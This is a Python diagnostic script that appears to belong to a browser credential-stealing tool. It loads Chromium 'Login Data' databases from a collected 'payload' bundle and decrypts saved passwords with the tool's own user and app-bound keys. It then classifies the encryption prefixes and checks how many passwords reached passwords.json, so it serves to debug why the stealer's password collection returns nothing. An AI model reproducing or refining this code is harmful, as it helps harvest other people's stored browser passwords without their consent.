"""Why a browser wrote no passwords.json.

The collector returns 0 for four different facts and logs none of them: no ``Login
Data``, no readable table, rows whose ciphertext will not open, or rows that decrypted
to nothing. This separates them against a collected bundle, so a zero is a result
instead of a guess.

    python password_probe.py <bundle-dir> [...]     # e.g. payload-plain/browsers
"""

from __future__ import annotations

import json
import sqlite3
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "sable"))

from agent.sources.browsers import chromium  # noqa: E402


def _prefixes(rows: list[dict]) -> dict[str, int]:
    counts: dict[str, int] = {}
    for row in rows:
        blob = row["password_value"]
        if blob is None:
            label = "null"
        elif not blob:
            label = "empty"
        elif isinstance(blob, str):
            label = "text"
        elif blob[:3] in (b"v10", b"v11", b"v20"):
            label = blob[:3].decode()
        elif blob[:5] == b"DPAPI":
            label = "DPAPI"
        else:
            label = "raw"
        counts[label] = counts.get(label, 0) + 1
    return counts


def probe(browser: Path) -> None:
    logins = sorted(browser.rglob("Login Data"))
    if not logins:
        print(f"{browser.name:<10} no Login Data in the bundle")
        return

    for login in logins:
        profile = login.parent
        keys = chromium.profile_keys(profile)
        rows = chromium.read_table(login, "logins", chromium._WANTED_PASSWORDS, 2000)

        opened = 0
        for row in rows:
            secret = chromium.secret_value(row["password_value"], keys, b"")
            if secret is not None:
                opened += 1

        published = browser / login.parent.name / "passwords.json"
        on_disk = []
        if published.is_file():
            on_disk = json.loads(published.read_text(encoding="utf-8"))

        print(
            f"{browser.name:<10} {login.parent.relative_to(browser).as_posix():<20} "
            f"rows={len(rows):<3} keys(user={bool(keys.user)}, "
            f"app_bound={bool(keys.app_bound)}) opened={opened:<3} "
            f"json={len(on_disk):<3} prefixes={_prefixes(rows)}"
        )


def main(argv: list[str]) -> int:
    if not argv:
        print(__doc__)
        return 1
    for item in argv:
        base = Path(item)
        for browser in sorted(p for p in base.iterdir() if p.is_dir()):
            probe(browser)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
